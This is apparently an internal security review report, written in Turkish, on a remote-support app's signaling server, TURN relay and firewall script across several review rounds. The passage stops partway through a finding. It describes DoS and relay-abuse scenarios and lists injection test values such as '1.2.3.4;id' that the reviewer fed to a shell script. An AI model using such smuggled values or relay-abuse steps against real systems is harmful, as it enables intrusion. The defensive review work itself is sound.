Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 1 (+2 bilgi notu). Kapanan: S-P2-1, S-P2-2, S-P2-3, S-P2-6, S-P2-7.
Açık kalan (kapsam gereği): S-P2-4 (metin düzeltildi, sunucu davranışı P3), S-P2-5 (P3 öncesi staging'de) ve P3 giriş şartları.

### Düzeltme doğrulaması
- **S-P2-1 — kapandı.** `caddy adapt` (caddy:2.11.9) çıktısı: web bloğu `headers.request.set{"X-Edge-Auth"}`
  (*set* = istemcinin aynı ad başlığını ezer), `/api/*` ve `/ws/*` blokları `delete X-Edge-Auth` (sır server'a gitmez).
  Web'e giden tek blok `handle` (Caddyfile:79-87); `@ops` 404. Üç reverse_proxy'de de `trusted_proxies` yok, yani Caddy
  gelen XFF'i yok sayıp tek değer (soket adresi) yazar. Web ilk öğeyi alıp `isIP` ile doğruluyor (edge-forward.ts:43-46),
  bu Caddy davranışıyla tutarlı. Karşılaştırma iki SHA-256 özeti üzerinde `timingSafeEqual` ile yapılıyor; uzunluk
  sızmıyor, boş değer reddediliyor (edge-forward.ts:19-24). Sır üç yerde de loglanmıyor: Caddy log filtresi
  `request>headers>X-Edge-Auth delete` (Caddyfile:42); web başlığı server'a iletmiyor (`forwardHeaders` yalnız XFF ve UA
  döndürüyor); server pino serileştiricisi yalnız method ve maskeli url yazıyor (logger.ts:39). Compose sırrı hem caddy
  hem web için `:?` ile zorunlu tutuyor (docker-compose.yml:110,127). `EDGE_PROXY_SECRET`'in `NEXT_PUBLIC_` öneki yok,
  `node:crypto` kullandığı için istemci paketine de giremez.
- **S-P2-2 — kapandı.** UA 512'ye kesiliyor (web), server audit'te 300'e kesiyor (audit/service.ts:44). Başlık enjeksiyonu
  mümkün değil: gelen başlık değerinde CR/LF olamaz (Node ayrıştırıcısı reddeder), undici `Headers` da reddeder.
  Gelen değerler latin1 olduğu için `slice` geçersiz bayt üretmiyor.
- **S-P2-3 — kapandı.** `ResolveFailedAlarm` (public.ts:37-74): tek sayaç + en çok 10.000 önek tutan Set, pencere
  başında temizleniyor. Alarm pencere başına bir kez tetikleniyor. Log içeriği yalnız `{failed, prefixes(sayı), windowSec}`,
  IP/önek/kod yazılmıyor. İstek engellenmiyor (G-02 ile uyumlu).
- **S-P2-6 — kapandı.** `goneAudit` (public.ts:113-117) anahtarı `sessionId:code`, sayaç limiti 2, pencere 10 dk: ilk
  olay yazılıyor, sonrakiler atlanıyor. Sayaç 50k kayıtla sınırlı. Anahtar üretmek için geçerli bir oturum token'ı/kodu
  gerekiyor, saldırgan sayacı dolduramıyor. Audit satırında token ve kod yok.
- **S-P2-7 — kapandı.** `env.ts:37-40` production'da `SESSION_REF_KEY` olmadan açılışı durduruyor (min 32).
- **Regresyon:** `repo.countOpen` artık ACTIVE + süresi dolmamış PENDING oturumları sayıyor (repo.ts:46-50). Süresi dolmuş
  PENDING kayıt limiti doldurmuyor, `FOR UPDATE` serileştirmesi korunuyor. Bir sorun görmedim. `lib/api.ts`
  `isUnauthenticated`/`EXPIRED_LOGIN_PATH` sabit bir yol kullanıyor; `next=` üretmediği için açık yönlendirme yüzeyi
  oluşmuyor.

### Bulgular
#### S-P2-T2-1 [DÜŞÜK] Edge sırrı yanlış yapılandırılırsa hata çalışma anında ortaya çıkıyor; tüm müşteriler tek IP limitini paylaşır — A05
Yer: apps/web/lib/server-api.ts:90 (`readEdgeSecret()` istek başına çağrılıyor), apps/web/lib/edge-forward.ts:30-37
Sorun: Production'da sır yoksa veya kısaysa web açılmaya devam ediyor; hata yalnız müşteri sayfası istendiğinde (500)
çıkıyor. Caddy ile web'deki sır farklıysa (biri yenilenip diğeri yeniden yaratılmadıysa) hata da çıkmıyor: XFF sessizce
iletilmiyor ve tüm müşteriler web IP'si (`172.30.0.3`) altında sayılıyor.
İstismar senaryosu: Sırlar uyuşmazken bir saldırgan dakikada 11 hatalı kod denemesi yapar. Bu, `172.30.0.3` ipKey'ini
15 dk kilitler. Kilit süresince hiçbir müşteri kod ile bağlanamaz (DoS). Token yolu da 30/dk'lık ortak sınıra düşer.
Runbook:103 belirtiyi ve tanıyı anlatıyor ama durumu kendiliğinden fark eden bir şey yok.
Düzeltme: (a) Web açılışında `readEdgeSecret()` çağrılsın (`instrumentation.ts` `register()`); sır yoksa süreç
başlamasın. (b) Server'da `ctx.ip === <web adresi>` olan public resolve için `log.warn` (oranı sınırlı) yazılsın ya da
metrik sayılsın; böylece uyuşmazlık görünür olur. (atanan ajan: frontend-dev (a), backend-dev (b)) — "Sonra" önerilir.

#### Bilgi notları (bulgu değil)
- `goneAudit` sayacı 50k kilitli kayıtla dolarsa `hit` true döner ve 410 audit'i atlanır (limit için fail-closed,
  audit için fail-open). Dolması için 50k farklı bitmiş oturumun geçerli token'ı gerekir, pratikte olmaz.
- `apps/web/lib/server-api.ts`'de `import "server-only"` yok. `node:crypto`, `next/headers` ve `cookies` içe aktarımları
  istemci paketine girmeyi zaten engelliyor; açık niyet için eklenmesi önerilir.

### Otomatik tarama çıktıları (Tur 2)
- `pnpm audit --audit-level=moderate`: **No known vulnerabilities found.**
- gitleaks v8.30.1 (`dir`, `.gitleaks.toml` ile, node_modules/.next hariç kopya, göreli yol): **no leaks found.**
  e2e sırrı (`playwright.config.ts:29`) ve CI sırrı (`ci.yml:100`) `generic-api-key` kuralını tetiklemiyor (düşük
  entropi), allowlist eklemeye gerek yok. Not: mutlak yolla (`/repo/...`) taranırsa mevcut allowlist'teki
  `^apps/server/test/helpers/app\.ts$` eşleşmiyor ve 1 bulgu çıkıyor. CI `git` modunda göreli yol kullandığı için
  sorun değil.
- `caddy adapt`: header işlemleri yukarıdaki gibi doğrulandı (set / delete, trusted_proxies yok).

## P2 Tur 3
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 0. Kapanan: S-P2-T2-1 (a + b) ve `server-only` bilgi notu.
Açık kalan (kapsam gereği, değişmedi): S-P2-4 (P3), S-P2-5 (P3 öncesi staging) ve P3 giriş şartları.

### Düzeltme doğrulaması
- **S-P2-T2-1 (a) web açılış kontrolü: kapandı.** `apps/web/instrumentation.ts:6-10` yalnız `NEXT_RUNTIME=nodejs` ve
  `NODE_ENV=production` koşulunda `lib/startup-check.ts`'i dinamik olarak import ediyor. `assertEdgeSecretOrExit()`
  (startup-check.ts:9-16) `readEdgeSecret()` hata verirse yalnız hata mesajını yazıp `process.exit(1)` çağırıyor. Mesaj
  sabit metin (`edge-forward.ts:34`: "EDGE_PROXY_SECRET gerekli (>= N karakter …)"), yani sır değeri ve uzunluğu
  loglanmıyor. İmaj (`apps/web/Dockerfile:27`) ve compose (`docker-compose.yml:106`) `NODE_ENV=production` veriyor,
  dolayısıyla kontrol staging/prod'da devrede.
  Edge sızıntısı yok: `.next/server/edge/chunks/_1wcossgycoscr._.js` içinde `register` boş bir fonksiyona derlenmiş
  (`async function t(){}`). `startup-check`, `process.exit` ve hata metni edge veya `static` paketlerinde yok; yalnız Node
  sunucu chunk'ında bulunuyor. Sınır: Caddy ile web'de iki farklı geçerli sır olması açılışta yakalanamaz; bu durumu (b)
  kapatıyor.
- **S-P2-T2-1 (b) server alarmı: kapandı.** `ClientIpIsProxyAlarm` (public.ts:79-97) `resolvePublicSession`'ın ilk
  satırında çağrılıyor (public.ts:150), yani token ve kod yollarının ikisinde de çalışıyor.
  - İstek engellenmiyor: `check()` hiçbir şey döndürmüyor ve fırlatmıyor.
  - Log satırı: `app.log` (istek logger'ı değil) ile yazılan `{alarm:"client_ip_is_proxy"}` + sabit mesaj. IP, token,
    reqId ve url yok. Entegrasyon testi (sessions-public.test.ts:172-196) IP'lerin ve token'ın logda olmadığını
    doğruluyor.
  - DoS/bellek: throttle `FixedWindowCounter(1, 60s, 60s, sweepIntervalMs:0)` ve tek sabit anahtar `"proxy"`
    kullanıyor; en çok 1 kayıt tutuyor, zamanlayıcı yok (bu yüzden `closePublicLimits`'te kapatılmaması sızıntı
    oluşturmuyor). Maliyet O(1). Alarm dakikada en çok 1 warn üretiyor. Dışarıdan bir istemci tetikleyemiyor, çünkü
    Caddy XFF'i her zaman yeniden yazıyor ve dış istemcinin IP'si 172.30.0.2/31 içinde olamıyor.
- **`cidrMatcher` (ip.ts:37-49): doğru.** `node:net` `BlockList` ile denendi (`172.30.0.2/31` ve `fd00:30::/64`):
  | Girdi | Sonuç |
  |---|---|
  | `.2` / `.3` / `.4` | true / true / false |
  | `::ffff:172.30.0.3`, `::FFFF:…`, `0:0:0:0:0:ffff:172.30.0.3`, `::ffff:ac1e:3` | true (eşlemeli IPv6 yakalanıyor) |
  | `172.30.0.3%eth0`, `fd00:30::1%lo` | true (zone id atılıyor) |
  | `""`, `garbage`, `1.2.3.4/32`, `::1` | false (fırlatmıyor) |
  | IPv6 CIDR'a karşı IPv4 / eşlemeli adres | false |
  | `cidr` `undefined` veya `""` | her zaman false |

  Geçersiz CIDR'da `addSubnet` fırlatır, ama `env.ts:7-12` biçimi ve prefix üst sınırını (≤32 / ≤128) açılışta
  doğruluyor; production'da CIDR zorunlu (env.ts:33). Hata kapalı yönde çalışıyor: eşleşme yoksa sonuç yalnız
  "alarm yok" oluyor.
- **`server-only`: kapandı.** `apps/web/lib/server-api.ts:1` içinde `import "server-only"` var. Next'in kendi derlenmiş
  kopyasına yönlendiriliyor, yeni bağımlılık eklenmemiş.

### Bulgular
Yok.

### Otomatik tarama / test (Tur 3)
- `vitest run test/unit/{ip,resolve-alarm,env-logger}.test.ts` (server): 3 dosya, **13/13 geçti**.
- Build çıktısı taraması (edge/static chunk'larında `startup-check` / `process.exit` / hata metni): **yok**.
- Bağımlılık değişmediği için `pnpm audit` ve gitleaks Tur 2 sonuçları geçerli.

---

## P3 kod turu
DURUM: DÜZELTİLMELİ
Özet: Kritik 0 / Yüksek 1 / Orta 1 / Düşük 7. Tek Yüksek bulgu bağımlılık sürümünden geliyor, düzeltmesi tek satır.
Protokol ve oda mantığında Kritik/Yüksek bulgu yok.

### Bulgular (öncelik sırasıyla)

#### S-P3-1 [YÜKSEK] `ws` 8.18.3: küçük parçalı çerçevelerle bellek tüketme DoS (GHSA-96hv-2xvq-fx4p) — A06 Vulnerable Components
Yer: apps/server/package.json (`ws`), kilit `ws@8.18.3`; apps/server/src/signaling/ws.ts:54 (`maxPayload: 1024 * 1024`)
Sorun: `pnpm audit` Yüksek: ws <8.21.0'da çok sayıda küçük fragment/veri parçası sunucu belleğini tüketiyor. Ayrıca Orta
(GHSA-58qx-3vcg-4xpx, <8.20.1, ilklenmemiş bellek ifşası).
Senaryo: Oturum kodunu bilen biri (müşteri tarafı ya da kodu ele geçiren kişi) resolve → join ile ticket alıyor ve
**admit beklemeden** lobi WS'ine bağlanıyor. Ardından tek mesajı binlerce küçük fragmana bölerek gönderiyor. Mesaj
tamamlanmadığı için 64 KB/50 msg/sn kontrolleri (handlers.ts:41-43) hiç devreye girmiyor. Tek instance (ADR-0005)
OOM olursa tüm tenant'ların aktif oturumları düşer. Kimliği doğrulanmış her teknisyen de aynı saldırıyı yapabilir.
Düzeltme (backend-dev): `ws` ≥ 8.21.0 sürümüne geçilmeli, `pnpm install` ile kilit güncellenmeli ve `pnpm audit`
temiz çıkmalı. Ek önlem: `maxPayload` değeri `WS_MAX_PAYLOAD` (64 KB) ile eşitlenmeli. 64 KB üstü 1009 ile kapanır,
AC-17 testi buna göre güncellenir (implementation.md P3 madde 6). Böylece bağlantı başına tampon 16 kat küçülür.

#### S-P3-2 [ORTA] coturn `allowed-peer-ip=<public IP>` TURN host'unun tüm UDP portlarını relay'e açıyor — A05/A10 (SSRF benzeri)
Yer: deploy/turn/entrypoint.sh:56-57; deploy/turn/docker-compose.yml:15 (`network_mode: host`)
Sorun: relay↔relay için TURN'ün kendi public IP'si izin listesine alınmış. coturn'de `allowed-peer-ip` port ayırmıyor,
bu yüzden yalnız 49160-49199 değil o IP'deki **her UDP portu** relay edilebiliyor. Staging'de TURN, publish
sunucusunun (185.126.217.99, başka servisler de çalışıyor) host ağında. Relay'in kendi IP'sine gönderdiği paket
loopback üzerinden döndüğü için UFW'nin dış kurallarını atlıyor.
Senaryo: Admit edilen misafir (ya da credential'ı ele geçiren biri) TURN credential'ıyla allocation açıyor ve peer
olarak `185.126.217.99:<udp port>` veriyor. Böylece host'ta 0.0.0.0'a bağlı, dışarıya kapalı UDP servislerine (DNS,
VPN, SNMP, syslog vb.) ulaşıyor. coturn'ün kendi 3478'ine relay ederek TURN-in-TURN zinciri de kurabiliyor.
`no-tcp-relay` riski UDP ile sınırlıyor.
Düzeltme (devops): Host'ta OUTPUT kuralı eklenmeli: kaynak portu 49160:49199 olan ve hedefi `$PUBLIC_IP` olan UDP
paketlerinde hedef port 49160:49199 değilse DROP (iptables/nftables, runbook §9). `test-denied.sh`'e iki negatif test
eklenmeli: `$PUBLIC_IP:3478` ve `$PUBLIC_IP:53` relay edilememeli. Staging'de `ss -ulnp` çıktısı runbook'a
yazılmalı. Prod'da ayrı VM planı (ADR-0007) korunmalı.

#### S-P3-3 [DÜŞÜK] IPv6 relay sınırsız: `relay-ip`/`listening-ip` verilmemiş
Yer: deploy/turn/turnserver.base.conf:4-19, 39-52; entrypoint.sh:49
Sorun: Host'un global IPv6'sı varsa coturn IPv6 relay açabilir (REQUESTED-ADDRESS-FAMILY). Host'un kendi IPv6
adresi ve sağlayıcının IPv6 komşuları denied listesinde yok. IPv4'teki sağlayıcı bloğu engelinin IPv6 karşılığı da yok.
Düzeltme (devops): Entrypoint, `TURN_EXTERNAL_IP`'nin private kısmından `relay-ip=<private v4>` (gerekirse
`listening-ip`) üretmeli. Alternatif olarak host'un IPv6 /64'ü local listeye eklenmeli. `test-denied.sh`'e IPv6
allocation denemesi eklenmeli.

#### S-P3-4 [DÜŞÜK] Süresi dolan PENDING oturum odaya bildirilmiyor; bazı odalar bellekten hiç silinmiyor
Yer: apps/server/src/sessions/service.ts:137-145 (expire yolu `closeSession` çağırmıyor); rooms.ts:121
(`rejectedIps.size === 0 && admitFails === 0` şartı)
Sorun: EXPIRED olan oturumda teknisyen WS'i ve lobi misafirleri açık kalıyor (lobi en fazla 5 dk). Ret veya hatalı
kod görmüş bir oda, teknisyen ayrıldıktan sonra süreç yeniden başlayana kadar bellekte duruyor. Oda üretmek kimlik
doğrulaması gerektirdiği için etkisi yavaş bir sızıntı.
Düzeltme (backend-dev): Expiry işi başarılı `expireOne` sonrası `rooms.closeSession(id, "timeout")` çağırmalı;
`RoomNotifier` tipine `"timeout"` eklenmeli. `dropRoomIfIdle` yalnız PENDING süresi geçmiş odaları ret listesiyle
birlikte silebilir.

#### S-P3-5 [DÜŞÜK] CI gitleaks (git modu) yeni P3 test dosyalarında kırılacak
Yer: .gitleaks.toml:8-11 (allowlist yalnız `apps/server/test/helpers/app.ts`). Yerel dir taramasında `generic-api-key`
veren dosyalar: apps/server/test/helpers/ws.ts:56, test/integration/signaling-lifecycle.test.ts:15,
test/unit/signaling.test.ts:12 ve :67. Değerlerin hepsi sahte TURN secret'ı.
Düzeltme (backend-dev): Bu yollar allowlist'e eklenmeli ya da satırlara `// gitleaks:allow` yazılmalı. Commit
öncesinde git modunda yeniden taranmalı. Not: allowlist regex'i `^apps/...` ile başladığı için dir modunda
(`/repo/apps/...`) eşleşmiyor; yerel kontrol için `(^|/)apps/...` biçimi önerilir.

#### S-P3-6 [DÜŞÜK] TURN credential oturum bittikten sonra 60 dakikaya kadar geçerli
Yer: apps/server/src/signaling/turn.ts:29; env.ts:35 (`TURN_CRED_TTL_MIN` varsayılan 60)
Sorun: Admin terminate, ret veya müşterinin bitirmesi credential'ı iptal etmiyor (`use-auth-secret` yapısı gereği).
Eski misafir relay'i internete yönelik bant genişliği için kullanmaya devam edebilir (8 Mbps ve user-quota=8 ile
sınırlı).
Düzeltme (devops/backend-dev): Varsayılan 15-20 dk yapılmalı. Yenileme mekanizması (`ice.servers`, active.ts:48-60)
zaten var, ek maliyeti yok.

#### S-P3-7 [DÜŞÜK] `/ws/tech` upgrade'inde oran sınırı yok
Yer: apps/server/src/signaling/ws.ts:80-91
Sorun: Origin başlığı tarayıcı dışından taklit edilebilir. Her rastgele çerezli istek `resolveSession` ve
`findForSignal` ile DB'ye gidiyor; misafir yolundaki `guestIp` (31/dk) sınırının teknisyen yolunda karşılığı yok.
Düzeltme (backend-dev): Aynı `FixedWindowCounter` IP başına teknisyen yoluna da uygulanmalı.

#### S-P3-8 [DÜŞÜK] WS yeniden doğrulaması yetki daraltmasını yansıtmıyor; `endByTechnician` hiç çağrılmıyor
Yer: apps/server/src/signaling/ws.ts:176-183; rooms.ts:208-211
Sorun: 60 sn'lik kontrol yalnız oturum/kullanıcı/tenant geçerliliğine bakıyor. `remote_control.use`/`file_transfer.use`
geri alınsa da `room.caps` admit anındaki haliyle kalıyor. AC-115 için yazılan `endByTechnician` hiçbir yerden
çağrılmıyor. P3'te caps henüz bir işlem açmadığı için şimdilik etkisi yok.
Düzeltme (backend-dev): P7 giriş şartı. Yetki/rol değişikliği ve deaktivasyon servisleri `rooms.endByTechnician`
çağırmalı ya da yeniden doğrulama sırasında `permissions` tazelenip caps daralırsa oda bitirilmeli.

#### S-P3-9 [DÜŞÜK] coturn stdout logunda müşteri/peer IP'leri ve kullanıcı adı (sessionId) var
Yer: deploy/turn/turnserver.base.conf:17-18; docker-compose.yml:45-47 (json-file 5×10 MB, saklama süresi tanımsız)
Düzeltme (devops): Runbook'a log saklama süresi (KVKK) yazılmalı. Gerekmiyorsa log seviyesi düşürülmeli. Secret
logda görünmüyor (yalnız `TURN_CONFIG_CHECK` çıktısı var, o da maskeli).

### Doğrulanacak (çalışma zamanı, devops)
- coturn CLI (5766/tcp) kapalı mı: staging'de `ss -tlnp | grep -E '5766|9641'` çalıştırılmalı. 9641 yalnız
  127.0.0.1'de olmalı, 5766 hiç görünmemeli. Kod tarafında `--cli` verilmiyor; 4.18 varsayılanına güveniliyor.

### Otomatik tarama çıktıları
- `pnpm audit --audit-level=moderate`: **2 açık**. Yüksek 1: ws GHSA-96hv-2xvq-fx4p. Orta 1: ws GHSA-58qx-3vcg-4xpx.
  Yol: `apps/server > ws@8.18.3`. → S-P3-1.
- gitleaks v8.30.1 (docker, dir modu, `.gitleaks.toml`): 15 eşleşme, hepsi `generic-api-key`.
  - 10'u `apps/web/.next/**` derleme çıktısı (git-ignore, repoya girmiyor; Next preview anahtarı derleme başına üretiliyor).
  - 5'i sahte test değeri: test/helpers/app.ts:13 (allowlist'te ama dir modunda eşleşmiyor) ve S-P3-5'teki 4 satır.
  - Gerçek gizli bilgi bulunmadı.
- `deploy/turn/certs/` ve `*.key` git-ignore'da; repoda anahtar dosyası yok. `denied-peer-ip.local.conf` repoda yok,
  yalnız `.example` (RFC 5737 belgeleme IP'leri) var.

### Tasarımda vaat edilip kodda bulunmayanlar
- mimari §5.1 LobbyGuest "admitCodeHash (SHA-256 + oturum tuzu)": tuz olarak guestId (ULID) kullanılıyor. Hash yalnız
  bellekte tutulduğu ve kodu teknisyen girdiği için risk yok, yalnız kayda geçsin.
- AC-115 `endByTechnician` bağlantısı → S-P3-8 (P7/P9).
- P2 "P3 giriş şartları": madde 2 (atomik tüketim) karşılandı (repo.ts:145-151 koşullu `updateMany` + 5 CHECK + bellek
  `admitting` bayrağı). Madde 3 ADR-0012 ile karşılandı (`publicClientAllowed`). Madde 1 (`/public/agent/download?ref=`
  limiti) P6'ya kaldı.

### Olumlu
- WS kimlik: misafir yolunda sorgu dizesi 403 (ws.ts:103); credential yalnız `Sec-WebSocket-Protocol` üzerinden
  geliyor; `rs.v1` zorunlu ve tam bir credential bekleniyor; 43 karakterlik base64url regex var. Ticket ve nonce
  256 bit CSPRNG, depoda SHA-256 ile tutuluyor; `take` kontrolü ve silmeyi aynı senkron adımda yapıyor (yarış yok)
  ve depo 20k kayıtla sınırlı. Teknisyen yolunda Origin allowlist + çerez + `mustChangePassword` + **yalnız oturum
  sahibi** kontrolü var.
- Join: istemci türü (kind) istemcinin beyanından değil nonce kaydından alınıyor; IP limiti nonce tüketiminden önce
  uygulanıyor; durum yalnız okunuyor, tüketim admit'te.
- Admit: koşullu `updateMany` (PENDING ∧ expires>now ∧ consumed_at NULL) ve audit aynı TX'te; `room.admitting`
  bayrağı kontrolle aynı senkron adımda set ediliyor; 4 haneli kod `safeEqual` ile karşılaştırılıyor; lobi
  kodları tekil; 5. hatada lobi boşaltılıyor; ret listesi ipKey ile tutuluyor.
- Oda izolasyonu: oda upgrade anında bağlantıya bağlanıyor; relay alanları yeniden kuruluyor (gelen nesne olduğu
  gibi aktarılmıyor); strict zod, 64 KB sınırı, 50/sn token-bucket, ikili çerçeve reddi var. Lobi misafirinden SDP/ICE
  gelirse bağlantı 1008 ile kapanıyor. iceServers/TURN credential yalnız admit sonrası veriliyor (teknisyene de).
- Reconnect token her hello'da yenileniyor ve eskisi siliniyor. Bağlıyken ikinci bağlantı 403 alıyor ve audit'e
  yazılıyor. Teardown token'ı da temizliyor.
- Terminate: `sessions.terminate` yetkisi + tenant kapsamlı `updateMany` var; başka tenant'ın oturumu 404 dönüyor;
  audit yazılıyor.
- TURN: secret komut satırında yok (tmpfs'de 0600 yetkili config, umask 077); `TURN_CONFIG_CHECK` çıktısı maskeli;
  fail-closed doğrulama var (local liste zorunlu, satır biçimi denetleniyor). denied-peer-ip; 192.168.25.0/24 ve
  172.30.0.0/24'ü (192.168/16 ve 172.16/12 içinde), 169.254.169.254'ü, loopback'i, ::ffff eşlemeli adresleri ve
  6to4/Teredo/ULA aralıklarını kapsıyor. `no-tcp-relay`, quota ve max-bps tanımlı; Prometheus 127.0.0.1'de; imaj
  digest ile sabit; konteyner read_only, cap_drop ALL ve nobody kullanıcısıyla çalışıyor. CI'da denied-peer-ip
  negatif testleri var.
- /metrics: token yoksa 404, karşılaştırma `safeEqual` ile; etiketler sabit kümeden (IP/oturum/kod yok); Caddy
  dışarıya 404 dönüyor. Loglarda yalnız ret nedeni var; ticket/token/SDP/ICE loglanmıyor. Caddy logu sorgu dizesini,
  çerezi ve subprotocol'ü siliyor.

### Öneri: `docs/gereksinimler.md` §9 "Sonra"
S-P3-3, S-P3-4, S-P3-6, S-P3-7, S-P3-9. S-P3-8 P7 giriş şartı olarak işlenmeli. S-P3-1 bu pakette kapanmalı.
S-P3-2 staging'de kapanmalı (TURN publish sunucusunu paylaşıyor). S-P3-5 commit'ten önce kapanmalı.

## P3 Tur 2
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 2 (yeni, sertleştirme) + S-P3-8 (P7 giriş şartı, açık).
"P3 kod turu"ndaki S-P3-1..7 ve S-P3-9 doğrulandı. Yeni Kritik/Yüksek bulgu yok. P3 güvenlik kapısı açık.
Kalan tek şart çalışma zamanı kanıtı: staging'de `host-firewall.sh install` + `test-denied.sh` bölüm 4 + runbook §9.2.3
çıktısı test-raporuna eklenmeli (S-P3-2 kapanışı staging'de ölçülerek yapılır).

### Düzeltme doğrulaması
| Bulgu | Sonuç | Kanıt |
|---|---|---|
| S-P3-1 | KAPANDI | `apps/server/package.json:31` `ws: 8.21.0`, kilitte yalnız `ws@8.21.0`. `pnpm audit`: No known vulnerabilities. `signaling/ws.ts:54` `maxPayload: WS_MAX_PAYLOAD` (64 KB), `perMessageDeflate:false`. `ws.ts:80` soket `error` dinleyicisi (yalnız role+code loglanıyor), `ws.ts:160` upgrade öncesi ham soket `error` → destroy. |
| S-P3-2 | KAPANDI (kod) / staging kanıtı bekleniyor | `deploy/turn/host-firewall.sh`: `REMOTE-TURN-OUT` zinciri; kurallar yalnız `-p udp --sport 49160:49199` ∧ (`-d public` ∨ `-d private` ∨ `addrtype LOCAL`) ∧ `! --dport 49160:49199` → DROP. `print` çıktısı staging girdisiyle doğrulandı (public 185.126.217.99, NAT arkasında yerel olmasa da `-d` kuralıyla kapsanıyor). `test-denied.sh:100-120` aralık içi echo + 3480/3478/53 DROP sayacı. |
| S-P3-3 | KAPANDI | `entrypoint.sh` `relay-ip=$PRIVATE_IP` (is_ipv4 ile doğrulanmış), IPv6 relay 440. |
| S-P3-4 | KAPANDI | `sessions/service.ts:164` başarılı expiry sonrası `closeSession(id,"timeout")`. `rooms.ts:129-145` ret/hata taşıyan boş oda yalnız `expiresAt`'e kadar tutuluyor; `timers.idle` teardown'da (`rooms.ts:216`) temizleniyor. |
| S-P3-5 | KAPANDI | Sahte secret'lar `test/helpers/secrets.ts`'te; `.gitleaks.toml` `(^|/)apps/server/test/helpers/(app|secrets)\.ts$`. gitleaks dir: kaynakta 0 bulgu. |
| S-P3-6 | KAPANDI | `env.ts:35` varsayılan 20, compose `${TURN_CRED_TTL_MIN:-20}`, runbook:183 güncel. |
| S-P3-7 | KAPANDI | `ws.ts:59,87-88` ayrı `techIp` sayacı (31/dk, 60 sn kilit), Origin/çerez/DB kontrolünden önce. IP, güvenilen proxy zinciriyle hesaplanıyor (`clientIp`, XFF taklidi yok). |
| S-P3-9 | KAPANDI | json-file 3×5 MB; runbook §9.8.1 haftalık root cron (girdi `docker inspect`'ten, kullanıcı girdisi yok); entrypoint `cli*/verbose/log-binding` görürse başlamıyor. |
| S-P3-8 | AÇIK (P7 giriş şartı) | Değişmedi. `endByTechnician` testi eklendi ama çağıran uç yok. |

### Paylaşımlı sunucu etkisi (host-firewall.sh) — değerlendirme
- **Zincir kapsamı dar:** OUTPUT'a yalnız tek atlama ekleniyor. Zincirde yalnız DROP var, ACCEPT/RETURN yok. Bu yüzden
  diğer projelerin, UFW'nin (ufw-*) ve Docker'ın (DOCKER-*, nat, FORWARD) kural sırasını ve kararını değiştirmiyor.
  Bridge ağındaki konteyner trafiği OUTPUT'tan geçmiyor (FORWARD/INPUT). Etkilenebilecek tek paket şu: host ağ ad
  alanında 49160-49199'dan çıkan ve host'un kendi adresine aralık dışı porta giden UDP.
- **Reserved ports:** yalnız ephemeral (otomatik) atamayı etkiliyor. Açık `bind` serbest. ~28k'lık havuzdan 40 port
  çıkıyor, etkisi önemsiz. Mevcut liste korunuyor, remove yalnız tam eşleşen `49160-49199` girdisini çıkarıyor.
- **remove/uninstall:** yalnız kendi atlamasını (`-D OUTPUT -j REMOTE-TURN-OUT` döngüsü), kendi zincirini ve sabit adlı
  systemd dosyalarını siliyor. Değişken içeren `rm` yok. Başka zincire `-F/-X` uygulanmıyor.
- **Girdi doğrulama:** IP'ler v4/v6 regex'inden geçiyor, portlar yalnız rakam olabiliyor. `.env` `source` edilmiyor,
  yalnız `TURN_EXTERNAL_IP` satırı sed ile okunuyor. Denendi: `TURN_EXTERNAL_IP='1.2.3.4;id'` ve
  `TURN_FW_SELF_IPS='::1 -j ACCEPT'` → "geçersiz IP" ile durdu.
- **Entrypoint relay-ip:** `${TURN_EXTERNAL_IP#*/}` + `is_ipv4`. Birden fazla `/` reddediliyor. Yanlış IP verilirse
  coturn bind edemiyor ve kapalı kalıyor (fail closed).

### Yeni bulgular
#### S-P3-T2-1 [DÜŞÜK] host-firewall.sh: yarım uygulamada fail-open penceresi, satır tabanlı IP doğrulaması — A05
Yer: deploy/turn/host-firewall.sh:44-45 (`is_v4/is_v6`: `echo | grep -Eq`), :91-99 (`do_apply`: `-F` sonra tek tek `-A`), :63-70 (`reserve_add`)
Sorun:
1. `do_apply` önce zinciri boşaltıyor, sonra kuralları tek tek ekliyor. Bir `-A` hata verirse (ör. regex'ten geçen
   ama geçersiz olan `999.1.1.1` ya da `:::::`) betik `set -e` ile duruyor. OUTPUT atlaması yerinde kalıyor ama zincir
   boş ya da eksik oluyor (fail-open). Timer her 5 dakikada aynı hatayı tekrarlıyor.
2. `grep -Eq` satır bazında eşleştiriyor. Env'den gelen çok satırlı bir değerin yalnız ilk satırının geçerli olması
   yetiyor. Aynı kalıp `entrypoint.sh:15` `is_ipv4`'te de var; orada sonraki satır coturn config'ine yazılıyor
   (ör. `allow-loopback-peers`). Değeri yalnız root/.env sahibi verebildiği için güven sınırı aşılmıyor. Bu bir
   sertleştirme bulgusu.
3. Çekirdek, mevcut bir komşu ya da örtüşen rezervi bizim aralıkla birleştirirse `reserved_ok` (tam satır eşleşmesi)
   kalıcı olarak yanlış dönüyor. Bu durumda `check` sürekli başarısız oluyor, `ensure` her 5 dakikada `-F` ile yeniden
   uyguluyor, `remove` de birleşik aralığı geri alamıyor.
İstismar senaryosu: Doğrudan dış istismar yok. Yönetici hatası ya da beklenmeyen bir çekirdek/modül hatası S-P3-2
korumasını sessizce kaldırabilir.
Düzeltme (devops): Kuralları geçici bir zincirde (`REMOTE-TURN-OUT-NEW`) kurun, başarılı olursa atlamayı değiştirip
eskisini silin. Ya da tek seferde `iptables-restore --noflush` kullanın. IP doğrulamasını `case` kalıbı ve oktet
≤255 kontrolüyle yapın, `[ "$(printf %s "$1" | wc -l)" -eq 0 ]` ile çok satırlı değeri reddedin (entrypoint dahil).
`reserved_ok` için kapsama kontrolü yeterli olmalı (reserve_add'deki awk mantığı); `check` hatasında timer sessizce
döngüye girmemeli, journald'a `err` yazmalı.

#### S-P3-T2-2 [DÜŞÜK] systemd timer, repo klonundaki betiği 5 dakikada bir root olarak çalıştırıyor — A08
Yer: deploy/turn/host-firewall.sh:104-113 (`ExecStart=$SELF_PATH ensure`, `/opt/remote/deploy/turn/host-firewall.sh`)
Sorun: Root, repo çalışma kopyasındaki dosyayı ve aynı dizindeki `.env`/`turnserver.base.conf`'u periyodik olarak
çalıştırıyor/okuyor. `/opt/remote` root dışında bir kullanıcının (deploy/CI kullanıcısı) yazabileceği bir yer
olursa ya da `git pull` ile gelen bir değişiklik incelenmeden alınırsa, kod 5 dakika içinde root olarak çalışır.
